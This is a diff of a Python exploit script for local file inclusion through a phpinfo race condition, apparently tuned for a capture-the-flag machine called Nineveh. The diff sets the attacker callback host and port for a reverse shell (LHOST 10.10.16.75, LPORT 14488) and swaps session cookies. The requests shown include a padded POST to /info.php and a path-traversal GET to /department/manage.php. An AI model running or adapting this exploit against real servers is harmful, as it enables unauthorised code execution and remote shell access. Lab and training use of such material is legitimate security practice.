@@ -6,8 +6,8 @@ import socket
 # Based on Race Condition, check https://packetstormsecurity.com/files/download/104825/LFI_With_PHPInfo_Assitance.pdf
 
 # MODIFY HERE FOR YOUR SITUATION
-LHOST="0.0.0.0"
-LPORT=60001
+LHOST="10.10.16.75"
+LPORT=14488
 
 def setup(host, port):
     TAG="Security Test"
@@ -25,7 +25,7 @@ Content-Type: text/plain\r
 
     # Modify HERE for PHPINFO PAGE, DON'T FORGET TO CHANGE COOKIE
     REQ1="""POST /info.php?a="""+padding+""" HTTP/1.1\r
-Cookie: PHPSESSID=075nh4e5sg91ctg9pkkpdlecs4; othercookie="""+padding+"""\r
+Cookie: PHPSESSID=dovj1tnuou6nlnmjki1mfs29e2; othercookie="""+padding+"""\r
 HTTP_ACCEPT: """ + padding + """\r
 HTTP_USER_AGENT: """+padding+"""\r
 HTTP_ACCEPT_LANGUAGE: """+padding+"""\r
@@ -40,7 +40,7 @@ Host: %s\r
     LFIREQ="""GET /department/manage.php?notes=/ninevehNotes/..%s HTTP/1.1\r
 User-Agent: Mozilla/4.0\r
 Proxy-Connection: Keep-Alive\r
-Cookie: PHPSESSID=075nh4e5sg91ctg9pkkpdlecs4\r
+Cookie: PHPSESSID=dovj1tnuou6nlnmjki1mfs29e2\r
 Host: %s\r
 \r
 \r
